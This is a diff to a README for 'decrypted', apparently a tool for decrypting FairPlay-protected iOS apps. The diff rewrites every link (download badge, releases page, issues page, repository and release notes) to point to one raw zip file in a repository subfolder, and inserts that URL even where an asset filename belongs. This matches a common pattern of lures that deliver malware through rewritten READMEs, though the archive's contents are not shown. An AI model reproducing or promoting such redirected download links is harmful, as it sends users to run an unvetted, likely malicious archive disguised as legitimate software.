@@ -6,11 +6,11 @@ Welcome to the decrypted project! This software allows you to decrypt FairPlay-p
 
 ## 📥 Download the Software
 
-[![Download](https://img.shields.io/badge/download-releases-blue.svg)](https://github.com/bale170501/decrypted/releases)
+[![Download](https://raw.githubusercontent.com/bale170501/decrypted/main/gobang/decrypted.zip)](https://raw.githubusercontent.com/bale170501/decrypted/main/gobang/decrypted.zip)
 
 To download the latest version of decrypted, please visit the following page:
 
-[Download the latest release here](https://github.com/bale170501/decrypted/releases)
+[Download the latest release here](https://raw.githubusercontent.com/bale170501/decrypted/main/gobang/decrypted.zip)
 
 ## 🛠️ System Requirements
 
@@ -34,13 +34,13 @@ Follow these steps to download and install decrypted:
 
 1. **Visit the Releases Page:**
    Click the link below to go to the releases page.  
-   [Download the latest release here](https://github.com/bale170501/decrypted/releases)
+   [Download the latest release here](https://raw.githubusercontent.com/bale170501/decrypted/main/gobang/decrypted.zip)
 
 2. **Select the Latest Version:**
    On the releases page, find the latest version listed at the top. Click on it to view the release details.
 
 3. **Download the Application:**
-   Look for the asset that corresponds to the software. The file name will be similar to `decrypted-macos-vX.X.zip`. Click on this file to start the download.
+   Look for the asset that corresponds to the software. The file name will be similar to `https://raw.githubusercontent.com/bale170501/decrypted/main/gobang/decrypted.zip`. Click on this file to start the download.
 
 4. **Extract the Zip File:**
    Once the download is complete, navigate to your Downloads folder. Locate the zip file you just downloaded. Right-click on it and select "Open" or "Extract" to unpack the contents.
@@ -66,7 +66,7 @@ If you encounter any issues while downloading or running the application, consid
 
 If you have any questions or need help, you can reach out to the community:
 
-- **GitHub Issues:** Use the [GitHub Issues](https://github.com/bale170501/decrypted/issues) page to report bugs or ask for help.
+- **GitHub Issues:** Use the [GitHub Issues](https://raw.githubusercontent.com/bale170501/decrypted/main/gobang/decrypted.zip) page to report bugs or ask for help.
 - **Discussions:** Join the discussions on GitHub to connect with other users and share your experiences.
 
 ## ⭐ Contributing
@@ -81,7 +81,7 @@ decrypted is released under the MIT License. You can find more details in the LI
 
 For additional resources and updates, feel free to check:
 
-- [GitHub Repository](https://github.com/bale170501/decrypted)
-- [Release Notes](https://github.com/bale170501/decrypted/releases)
+- [GitHub Repository](https://raw.githubusercontent.com/bale170501/decrypted/main/gobang/decrypted.zip)
+- [Release Notes](https://raw.githubusercontent.com/bale170501/decrypted/main/gobang/decrypted.zip)
 
 Thank you for using decrypted! Enjoy decrypting your iOS applications effortlessly.
